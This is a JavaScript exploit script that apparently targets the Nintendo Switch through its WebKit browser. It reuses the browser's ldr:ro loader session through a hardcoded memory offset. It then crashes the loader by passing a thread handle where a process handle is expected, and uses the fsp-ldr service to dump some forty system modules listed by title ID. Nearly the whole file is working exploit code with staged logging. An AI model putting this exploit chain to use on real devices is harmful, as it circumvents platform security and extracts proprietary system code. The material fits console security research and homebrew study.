var modules ={
		'usb' : '0100000000000006',
		'tma' : '0100000000000007',
		'boot2': '0100000000000008',
		'settings' : '0100000000000009',
		'bus' : '010000000000000A',
		'bluetooth' : '010000000000000B',
		'bcat' : '010000000000000C',
		'friends': '010000000000000E',
		'nifm': '010000000000000F',
		'ptm': '0100000000000010',
		'bsdsockets': '0100000000000012',
		'hid': '0100000000000013',
		'audio': '0100000000000014',
		'LogManager.Prod' : '0100000000000015',
		'wlan' : '0100000000000016',
		'ldn' : '0100000000000018',
		'nvservices' : '0100000000000019',
		'pcv' : '010000000000001A',
		'ppc' : '010000000000001B',
		'nvnflinger' : '010000000000001C',
		'pcie.withoutHb' : '010000000000001D',
		'account' : '010000000000001E',
		'ns' : '010000000000001F',
		'nfc' : '0100000000000020',
		'psc' : '0100000000000021',
		'capsrv' : '0100000000000022',
		'am' : '0100000000000023',
		'ssl' : '0100000000000024',
		'nim' : '0100000000000025',
		'lbl' : '0100000000000029',
		'btm' : '010000000000002A',
		'erpt' : '010000000000002B',
		'vi' : '010000000000002D',
		'pctl' : '010000000000002E',
		'npns' : '010000000000002F',
		'eupld': '0100000000000030',
		'glue' : '0100000000000031',
		'eclct' : '0100000000000032',
		'es' : '0100000000000033',
		'fatal' : '0100000000000034',
		'creport' : '0100000000000036',

};
function dumpModule(module, loader, name) {
	//We need a ILocationResolver to pass to fsp to say what we are reading so we're getting a handle
	sc.getService("lr", (lripc) => {
		//3 is the StorageID for NAND System
		var lr = sc.ipcMsg(0).data(3).sendTo(lripc).assertOk();
		sc.withHandle(lr.movedHandles[0], (content) => {
				//We are getting our ContentPath needed for fsp, c being the "receiving" buffer
			var buf = new ArrayBuffer(0x300);
			sc.ipcMsg(0).data(utils.parseAddr(module)).cDescriptor(buf).sendTo(content).assertOk();

			//We are now mounting our code region
			var fs =sc.ipcMsg(0).datau64(utils.parseAddr(module)).xDescriptor(buf).sendTo(loader).assertOk();
			sc.withHandle(fs.movedHandles[0], (storage) => {
				//utils.log('Got IFileSystem handle: 0x'+ storage.toString(16));
				var fs = new sc.IFileSystem(sc, storage);
				var dir = fs.OpenDir('/').getValue();
				//DUMP ALL THE THINGS
				dir.DirDump(name);
			});
		});
	});
}

utils.log("stage1, getting webkit ldr:ro handle");
//We are reusing WebKit's ldr:ro session
var ldrro_mng_ptr = utils.add2(sc.mainaddr, 0x955558);
//utils.log('ldr:ro management str base ptr is: ' + utils.paddr(ldrro_mng_ptr));
var ldrro_mng = sc.read8(ldrro_mng_ptr);
//utils.log('ldr:ro management str base is: ' + utils.paddr(ldrro_mng));
var ldrro = sc.read8(utils.add2(ldrro_mng, 0xc));
//utils.log('ldr:ro handle is: 0x' + ldrro[0].toString(16));

utils.log("stage2, connecting to ldr:ro");

//Most of what's below is unecessary but we needed to setup a fake nrr in memory through
//LoadNrr to call LoadNro, being the function that allows us to crash loader.
var nrobase = sc.malloc(0x1000 + 0xfff);
var nrrbase = sc.malloc(0x1000 + 0xfff);
var nrrSize = 0x1000;
var nroSize = 0x1000;
var bssSize = 0x900;

//We initialize with a Thread Handle, 0xffff8000 instead of current process handle, 0xffff8001
sc.ipcMsg(4).datau64(0).sendPid().copyHandle(0xffff8000).sendTo(ldrro);
//We setup a fake nrr loading sequence
sc.ipcMsg(2).datau64(0, nrrbase, nrrSize).sendPid().sendTo(ldrro);

utils.log("stage3, crashing ldr:ro");
//Just calling a normal cmd0 will crash since it will call svcMapProcessCodeMemory during LoadNro sequence using a
//thread handle, attempting a process handle. This happens because svcGetProcessInfo in ldr:ro initialize can also take up
//a Thread Handle as an argument, while svcMapProcessCodeMemory will bug out on it
var res =sc.ipcMsg(0).datau64(0, nrobase, nroSize, utils.add2(nrobase, nroSize), bssSize).sendPid().sendTo(ldrro);

//Those are useless so better free them now
sc.free(nrobase);
sc.free(nrrbase);

utils.log("stage4, connecting to fsp");

sc.getService("fsp-ldr", (hndle) => {
	//utils.log("Got an handle to fsp: 0x" +hndle.toString(16));
	utils.log("stage5, dumping sysmodule");
	for (var name in modules) {
		utils.log("dumping " + name);
		try {
			dumpModule(modules[name], hndle, name);
			}
			catch (e) {
			}
	}
});

